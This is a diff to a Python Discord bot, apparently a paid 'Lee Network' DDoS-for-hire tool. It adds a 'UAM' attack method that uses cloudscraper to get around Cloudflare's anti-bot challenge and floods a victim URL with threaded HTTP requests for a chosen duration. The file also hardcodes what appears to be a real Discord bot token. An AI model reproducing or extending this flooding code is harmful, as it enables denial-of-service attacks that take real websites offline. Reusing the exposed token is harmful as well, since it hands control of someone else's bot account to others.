@@ -34,7 +34,7 @@ import random, datetime, discord
 buyers  = [944432932142071919]  #          
 admins  = [944432932142071919]  #   ID users            
 owners  = [944432932142071919]  #         
-methods = ['CFB', 'HTTPS', 'RAW']
+methods = ['CFB', 'HTTPS', 'RAW', 'UAM']
 year_now= datetime.datetime.now().strftime("%Y")     
 token   = 'MTAyMTA5MzY5MTE5NDA4NTQ3Nw.GZpiDk.ZnimFxTh4Xy8dONwHdQjb_oVFIKD_XL1OFtFsc'
 intents = discord.Intents.default()
@@ -155,6 +155,25 @@ async def ddos(ctx, method : str = None, victim : str = None, thread : str = Non
                     thread2 = max_thread
                 else:
                     thread2 = int(thread)
+                if method == 'UAM':
+                    embed = discord.Embed(title=f"Lee Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
+                    embed.set_thumbnail(url="https://raw.githubusercontent.com/LeQuan0410/gif/main/rocket.gif")
+                    embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
+                    embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
+                    embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
+                    embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
+                    embed.set_footer(text = f"©{year_now} LeQuan.")
+                    await ctx.send(embed=embed)
+                    until = datetime.datetime.now() + datetime.timedelta(seconds=int(time2))
+                    threads_count = 0
+                    scraper = cloudscraper.create_scraper(delay=10)
+                    while threads_count <= int(thread2):
+                        try:
+                            th = threading.Thread(target=AttackUAM, args=(victim, until, scraper))
+                            th.start()
+                            threads_count += 1
+                        except:
+                            pass
                 if method == 'CFB':
                     embed = discord.Embed(title=f"Lee Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                     embed.set_thumbnail(url="https://raw.githubusercontent.com/LeQuan0410/gif/main/rocket.gif")
@@ -213,6 +232,29 @@ async def ddos(ctx, method : str = None, victim : str = None, thread : str = Non
                    
            
 #====script====$
+def AttackUAM(victim, until_datetime, scraper):
+    headers = {
+            'User-Agent': random.choice(ua),
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
+            'Cache-Control': 'no-cache',
+            'Pragma': 'no-cache',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-User': '?1',
+            'TE': 'trailers',
+            }
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            scraper.get(victim, headers=headers)
+        except:
+            pass
+
+        
 def AttackHTTPS(victim, until_datetime):
     headers = {
             'User-Agent': random.choice(ua),
